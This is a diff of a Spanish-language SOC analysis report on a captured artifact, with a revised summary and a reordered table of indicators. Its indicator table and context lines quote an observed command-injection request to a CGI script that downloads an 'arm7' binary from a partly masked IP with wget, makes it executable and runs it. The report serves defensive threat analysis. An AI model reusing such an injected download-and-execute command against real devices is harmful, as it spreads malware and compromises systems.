@@ -4,16 +4,16 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Payload** a partir de la evidencia disponible en Oráculo SOC. Se asoció 1 comando observado o extraído.
+Artefacto de 191 B. Formato identificado como ASCII text, with CRLF line terminators. Entropía registrada: 5.21. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Se identificó 1 comando observado o extraído. Se identificaron 4 indicadores técnicos.
+
 
 ## 🏷️ Clasificación
 
-- **Categoría:** `Payload`
 - **Riesgo:** `Medium`
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T21:07:53+00:00`
+- **Registrado:** `2026-08-09T21:07:53.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -47,8 +47,8 @@ GET /cgi-bin/shortcut_telnet.cgi?cd%20/tmp%3Brm%20arm7%3Bwget%20http%3A//31.56.2
 | --- | --- | --- |
 | ip | 190.179.177.XXX | static_analysis |
 | ip | 31.56.209.XXX | static_analysis |
-| hash | fe28d3ca5d710904586bac6e082159887090e1068d4e53a5981cdc905682f1c9 | static_analysis |
 | command | GET /cgi-bin/shortcut_telnet.cgi?cd%20/tmp%3Brm%20arm7%3Bwget%20http%3A//31.56.209.XXX/arm7%3Bchmod%20777%20*%3B./arm7%2 | strings |
+| hash | fe28d3ca5d710904586bac6e082159887090e1068d4e53a5981cdc905682f1c9 | static_analysis |
 | ip | 45.198.224.XXX | artifact_source |
 
 ## 🔎 Triage
